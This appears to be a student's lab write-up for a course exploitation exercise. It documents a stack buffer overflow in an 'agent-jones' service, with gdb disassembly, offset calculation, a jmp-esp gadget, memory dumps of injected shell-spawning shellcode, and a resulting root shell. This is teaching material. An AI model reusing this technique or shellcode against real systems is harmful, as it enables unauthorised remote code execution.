@@ -1,0 +1,107 @@
+In Question 5, the vulnerability is in the "io" function. At line 28, "recv" read "n << 3" Bytes into the buffer, and we know that buf only has size of n Bytes. Hence, "n << 3" is bigger than n, and it can cause a bugger overflow.
+I can put my shell-code and and overwrite the return address. I use gdb to find the address of instruction "0xffe3" which is "jmp #esp" instruction. Next, I fill buf with all the "A" till eip address, overwrite the return address to the address of "jmp #esp", and  inject my shell-code.
+
+
+This is how I do it:
+_First: run "invoke -d agent-jones" to found out the address of 0xffe3 or "jmp #esp" instruction ---> 0x08048695
+(gdb) disas magic
+Dump of assembler code for function magic:
+   0x0804867d <+0>:  push   %ebp
+   0x0804867e <+1>:  mov    %esp,%ebp
+   0x08048680 <+3>:  mov    0xc(%ebp),%eax
+   0x08048683 <+6>:  shl    $0x3,%eax
+   0x08048686 <+9>:  xor    %eax,0x8(%ebp)
+   0x08048689 <+12>: mov    0x8(%ebp),%eax
+   0x0804868c <+15>: shl    $0x3,%eax
+   0x0804868f <+18>: xor    %eax,0xc(%ebp)
+   0x08048692 <+21>: orl    $0xe4ff,0x8(%ebp)
+   0x08048699 <+28>: mov    0xc(%ebp),%ecx
+   0x0804869c <+31>: mov    $0x3e0f83e1,%edx
+   0x080486a1 <+36>: mov    %ecx,%eax
+   0x080486a3 <+38>: mul    %edx
+   0x080486a5 <+40>: mov    %edx,%eax
+   0x080486a7 <+42>: shr    $0x4,%eax
+   0x080486aa <+45>: add    %eax,%eax
+   0x080486ac <+47>: mov    %eax,%edx
+   0x080486ae <+49>: shl    $0x5,%edx
+   0x080486b1 <+52>: add    %edx,%eax
+   0x080486b3 <+54>: sub    %eax,%ecx
+   0x080486b5 <+56>: mov    %ecx,%eax
+   0x080486b7 <+58>: mov    %eax,0xc(%ebp)
+   0x080486ba <+61>: mov    0xc(%ebp),%eax
+   0x080486bd <+64>: mov    0x8(%ebp),%edx
+   0x080486c0 <+67>: and    %edx,%eax
+   0x080486c2 <+69>: pop    %ebp
+   0x080486c3 <+70>: ret
+End of assembler dump.
+(gdb) x/i 0x08048695
+   0x8048695 <magic+24>:   jmp    *%esp
+
+
+
+
+_Second: break at line 37 to find out about eip  ---> 0x8048941
+And look at my "buf"
+
+Breakpoint 1, handle (client=8) at agent-jones.c:38
+38   memset(buf, 0, sizeof(buf));
+(gdb) info frame
+Stack level 0, frame at 0xbffff6a0:
+ eip = 0x8048774 in handle (agent-jones.c:38); saved eip 0x8048941
+ called by frame at 0xbffff700
+ source language c.
+ Arglist at 0xbffff698, args: client=8
+ Locals at 0xbffff698, Previous frame's sp is 0xbffff6a0
+ Saved registers:
+  ebp at 0xbffff698, eip at 0xbffff69c
+
+(gdb) x/32x buf
+0xbfffd9d0: 0x00000000  0x00000000  0x00000000  0x00000000
+0xbfffd9e0: 0x00000000  0x00000000  0x00000000  0x00000000
+0xbfffd9f0: 0x00000000  0x00000000  0x00000000  0x00000000
+0xbfffda00: 0x00000000  0x00000000  0x00000000  0x00000000
+0xbfffda10: 0x00000000  0x00000000  0x00000000  0x00000000
+0xbfffda20: 0x00000000  0x00000000  0x00000000  0x00000000
+0xbfffda30: 0x00000000  0x00000000  0x00000000  0x00000000
+0xbfffda40: 0x00000000  0x00000000  0x00000000  0x00000000
+
+(gdb) x/16x 0xbffff69c
+0xbffff69c: 0x08048941  0x00000008  0xbffff6c4  0xbffff6c0
+0xbffff6ac: 0xbffff6e4  0x00000004  0x08048580  0x00000000
+0xbffff6bc: 0x08048469  0x00000010  0x4ab30002  0x0100007f
+0xbffff6cc: 0x00000000  0x00000000  0xb3150002  0x00000000
+
+_Third: I found out that there are 7372 Bytes between "buf" and eip. Therefore, I can put address of "jmp #esp" instruction, and inject my shell-code after.
+
+This is the out-put of my egg file:
+	+ 7372 Bytes of "A"
+	+ 4 Bytes of the address of "jmp #esp" instruction
+	+ My shell-code
+
+_Fourth: For "exploit" file, I use port 6666 as show in the spec. 
+run ./exploit
+After inject the shell-code
+(gdb) x/32x buf
+0xbfffd9d0: 0x03030303  0x03030303  0x03030303  0x03030303
+0xbfffd9e0: 0x03030303  0x03030303  0x03030303  0x03030303
+0xbfffd9f0: 0x03030303  0x03030303  0x03030303  0x03030303
+0xbfffda00: 0x03030303  0x03030303  0x03030303  0x03030303
+0xbfffda10: 0x03030303  0x03030303  0x03030303  0x03030303
+0xbfffda20: 0x03030303  0x03030303  0x03030303  0x03030303
+0xbfffda30: 0x03030303  0x03030303  0x03030303  0x03030303
+0xbfffda40: 0x03030303  0x03030303  0x03030303  0x03030303
+
+(gdb) x/32x 0xbffff69c
+0xbffff69c: 0x08048695  0xe3f7db31  0x6a534353  0xb0e18902
+0xbffff6ac: 0x5b80cd66  0x0268525e  0x6a0a1a00  0x89505110
+0xbffff6bc: 0x58666ae1  0x418980cd  0xb004b304  0x4380cd66
+0xbffff6cc: 0x80cd66b0  0x3f6a5993  0x4980cd58  0x2f68f879
+0xbffff6dc: 0x6868732f  0x6e69622f  0x5350e389  0x0bb0e189
+0xbffff6ec: 0x000a80cd  0x08048960  0x00000000  0x00000000
+0xbffff6fc: 0xb7e454d3  0x00000002  0xbffff794  0xbffff7a0
+0xbffff70c: 0xb7fdc858  0x00000000  0xbffff71c  0xbffff7a0
+
+jones@pwnable:~$ ./exploit
+sending exploit
+whoami
+root
